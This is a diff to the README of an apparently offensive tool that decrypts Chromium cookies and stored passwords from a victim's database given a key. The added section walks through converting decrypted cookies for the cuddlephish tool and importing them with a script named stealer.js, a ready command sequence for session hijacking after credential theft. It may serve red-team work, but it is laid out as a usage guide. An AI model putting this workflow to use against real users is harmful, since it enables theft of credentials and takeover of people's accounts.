@@ -41,14 +41,14 @@ pip3 install -r requirements.txt
 Usage
 ```
 python3 decrypt.py -h                                                                                                                                                                      
-usage: decrypt.py [-h] -k KEY -o {cookies,passwords,cookie-editor,firefox} -f FILE
+usage: decrypt.py [-h] -k KEY -o {cookies,passwords,cookie-editor,cuddlephish,firefox} -f FILE
 
 Decrypt Chromium cookies and passwords given a key and DB file
 
 options:
   -h, --help            show this help message and exit
   -k KEY, --key KEY     Decryption key
-  -o {cookies,passwords,cookie-editor,firefox}, --option {cookies,passwords,cookie-editor,firefox}
+  -o {cookies,passwords,cookie-editor,cuddlephish,firefox}, --option {cookies,passwords,cookie-editor,cuddlephish,firefox}
                         Option to choose
   -f FILE, --file FILE  Location of the database file
 ```
@@ -93,6 +93,29 @@ Password: McTesty
 ```
 Decrypt Firefox Cookies and Stored Credentials: <br>
 https://github.com/lclevy/firepwd
+
+### CuddlePhish Support
+added cuddlephish option to the decrypt script which should support using the cookie with https://github.com/fkasler/cuddlephish
+
+```
+# Decrypt Cookies
+python3 decrypt.py -k "\xec\xfc..." -o cuddlephish -f ChromeCookies.db
+
+# Clone Project
+cd 
+git clone https://github.com/fkasler/cuddlephish
+cd cuddlephish
+
+# Install Dependencies Example on Debian 
+curl -fsSL https://deb.nodesource.com/setup_23.x -o nodesource_setup.sh
+sudo -E bash nodesource_setup.sh
+sudo apt-get install nodejs
+npm install
+
+# Import Cookies
+cp ~/cookie-monster/cuddlephish_YYYY-MM-DD_HH-MM-SS.json .
+node stealer.js cuddlephish_YYYY-MM-DD_HH-MM-SS.json
+```
 
 ## Installation
 Ensure Mingw-w64 and make is installed on the linux prior to compiling.
